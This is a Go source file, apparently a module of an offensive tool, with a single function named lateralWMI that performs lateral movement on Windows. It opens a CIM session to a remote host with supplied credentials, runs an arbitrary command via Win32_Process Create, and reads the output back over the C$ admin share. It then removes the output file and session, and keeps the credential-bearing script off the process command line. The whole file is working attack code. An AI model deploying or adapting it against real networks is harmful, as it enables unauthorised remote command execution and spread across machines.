//go:build windows
// +build windows

package main

import (
	"fmt"
	"strconv"
	"strings"
	"time"
)

func lateralWMI(target, user, pass, cmd string) (string, error) {
	if cmd == "" {
		cmd = "whoami"
	}
	outName := "fl_" + strconv.Itoa(int(time.Now().UnixNano()%1000000000)) + ".txt"
	outLocal := `C:\Windows\Temp\` + outName
	outRemote := `\\` + target + `\C$\Windows\Temp\` + outName

	// wmic.exe is removed on Windows 10 21H1+, 11, and Server 2022+. Use CIM
	// (Win32_Process Create) via PowerShell, which is available everywhere.
	// Output is redirected to a file on the target and read back over the admin
	// share; both the session and the file are cleaned up afterwards.
	var sb strings.Builder
	sb.WriteString("$ErrorActionPreference='Stop';")
	if user != "" && pass != "" {
		sb.WriteString(fmt.Sprintf("$sec=ConvertTo-SecureString '%s' -AsPlainText -Force;", pass))
		sb.WriteString(fmt.Sprintf("$cred=New-Object System.Management.Automation.PSCredential('%s',$sec);", user))
		sb.WriteString(fmt.Sprintf("$s=New-CimSession -ComputerName '%s' -Credential $cred;", target))
	} else {
		sb.WriteString(fmt.Sprintf("$s=New-CimSession -ComputerName '%s';", target))
	}
	sb.WriteString(fmt.Sprintf("Invoke-CimMethod -CimSession $s -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine='cmd.exe /c %s > %s 2>&1'};", cmd, outLocal))
	sb.WriteString("Start-Sleep -Seconds 3;")
	sb.WriteString(fmt.Sprintf("(Get-Content '%s') -join \"`n\";", outRemote))
	sb.WriteString(fmt.Sprintf("Remove-Item -Force '%s';", outRemote))
	sb.WriteString("Remove-CimSession -CimSession $s;")
	// runPowerShellStdin keeps the (possibly credential-bearing) script off the
	// powershell.exe command line.
	return runPowerShellStdin(sb.String())
}
